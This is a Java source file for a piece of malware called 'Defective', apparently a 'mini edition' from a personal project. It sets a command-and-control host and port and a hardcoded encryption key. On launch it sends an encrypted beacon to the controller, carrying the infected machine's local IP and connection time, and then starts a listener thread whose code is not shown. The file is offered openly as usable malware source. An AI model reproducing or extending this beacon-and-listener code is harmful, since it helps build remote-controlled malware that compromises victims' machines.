package me.aaronakhtar.defective;

import me.aaronakhtar.defective.crypto.AES;
import me.aaronakhtar.defective.threads.Listener;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * @author Aaron Akhtar - aaronakhtar.me / contact@aaronakhtar.me
 *
 * This is the mini edition, full edition coming out when I can be bothered to continue.
 *
 */
public class Defective {

    public static boolean joinMsgSent = false;

    /**if the malware is under development turn boolean true, this will print all exceptions etc.*/
    public static boolean underDevelopment = false;

    /**Encryption Key : Default is set to "bobsYaUncle"*/
    public static String encryptionKey = "bobsYaUncle";

    /**
     * Initializing all thread objects
     */
    private static Listener listenerThread = new Listener();

    /**Malwares port*/
    public static int malware_port = 4000;

    /**Command and Control Host Server Address & Command and Control Host Server Port*/
    public static String cnc_host = "1.1.1.1";
    public static int cnc_port = 1337;
    /**Assuming you've developed your own software too receive join alerts for when a new machine is infected with the malware set that softwares listening port here*/
    public static int cnc_listener_port = 777;

    public static void main(String[] args){
        sendJoinPacket();
        listenerThread.start();

    }

    /**
     * This will essentially send a packet to the CNC notifying it of the machines connection.
     * */
    public static void sendJoinPacket(){
        try(Socket socket = new Socket(cnc_host, cnc_listener_port)){
            String address = InetAddress.getLocalHost().getHostAddress();
            String joinString = "{Host: "+address+" | Connection Date: "+new SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(new Date()) +"}";
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
            writer.write(AES.encrypt(joinString, encryptionKey));
            writer.flush();
            writer.close();
            joinMsgSent = true;
        }catch (IOException e){
            if (underDevelopment){
                e.printStackTrace();
            }
        }
    }

}
